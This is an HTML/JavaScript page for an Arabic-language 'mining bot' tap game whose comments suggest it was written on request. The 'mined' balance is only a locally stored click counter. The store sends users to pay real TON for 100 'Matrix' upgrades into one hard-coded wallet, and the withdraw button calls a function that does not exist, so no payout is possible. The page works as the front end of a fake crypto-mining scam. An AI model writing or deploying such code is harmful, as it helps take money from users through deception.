<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Arbahi Mining Bot</title>
    <style>
        /* حافظت لك على التنسيق الأصلي بالكامل */
        body { background: #0a0e2a; color: white; font-family: sans-serif; text-align: center; margin: 0; padding-bottom: 80px; }
        .header { display: flex; justify-content: space-between; padding: 20px; background: rgba(255,255,255,0.05); }
        
        /* تصميم المتجر الأصلي لمنع التداخل */
        .store-grid { display: flex; flex-direction: column; gap: 10px; padding: 10px; }
        .miner-card { background: rgba(255,255,255,0.1); padding: 15px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; }
        
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: #161b3d; display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #333; }
        .page { display: none; }
        .active { display: block; }
        .nav-item { cursor: pointer; color: #888; }
        .nav-item.active { color: #00f2fe; }
    </style>
</head>
<body>

    <div class="header">
        <div>Arbahi Miner 🚀</div>
        <div id="withdrawable-balance">0.0000</div>
    </div>

    <div id="page-mine" class="page active">
        <div id="balance" style="font-size: 40px; margin: 50px 0;">0.0000</div>
        <div id="coin-btn" style="width: 150px; height: 150px; background: #f5b041; border-radius: 50%; margin: auto; cursor: pointer;"></div>
    </div>

    <div id="page-store" class="page">
        <h3>المتجر</h3>
        <div class="store-grid" id="store-grid"></div>
    </div>

    <div id="page-withdraw" class="page">
        <h3>السحب</h3>
        <input type="number" id="withdraw-amount" placeholder="الكمية">
        <button onclick="processWithdraw()">تأكيد</button>
    </div>

    <div class="nav-bar">
        <div class="nav-item active" onclick="showPage('mine')">تعدين</div>
        <div class="nav-item" onclick="showPage('store')">متجر</div>
        <div class="nav-item" onclick="showPage('withdraw')">سحب</div>
    </div>

    <script>
        // عنوان محفظتك الثابت
        const BINANCE_WALLET = "UQDHv9eGYkUfDz4N9QTpWESn86Yx_bZcM60kJ4dEDf6Fg8FO";
        
        let count = parseFloat(localStorage.getItem('bal')) || 0;
        let level = parseInt(localStorage.getItem('lvl')) || 1;

        function renderStore() {
            const grid = document.getElementById('store-grid');
            grid.innerHTML = "";
            for (let i = 1; i <= 100; i++) {
                const card = document.createElement('div');
                card.className = "miner-card";
                card.innerHTML = `<div>Matrix ${i}</div> 
                                  <button onclick="buy(${i}, ${(i*0.02).toFixed(2)})">
                                  ${i <= level ? 'مفعل' : 'شراء بـ ' + (i*0.02).toFixed(2) + ' TON'}
                                  </button>`;
                grid.appendChild(card);
            }
        }

        function buy(l, cost) {
            if(l <= level) return;
            // الرابط مدمج كما طلبت
            window.location.href = `ton://transfer/${BINANCE_WALLET}?amount=${cost * 1000000000}`;
            level = l; 
            localStorage.setItem('lvl', l); 
            renderStore();
        }

        document.getElementById('coin-btn').onclick = () => { count += 0.01; document.getElementById('balance').innerText = count.toFixed(4); };

        function showPage(p) {
            document.querySelectorAll('.page').forEach(x => x.classList.remove('active'));
            document.getElementById('page-' + p).classList.add('active');
        }

        renderStore();
    </script>
</body>
</html>
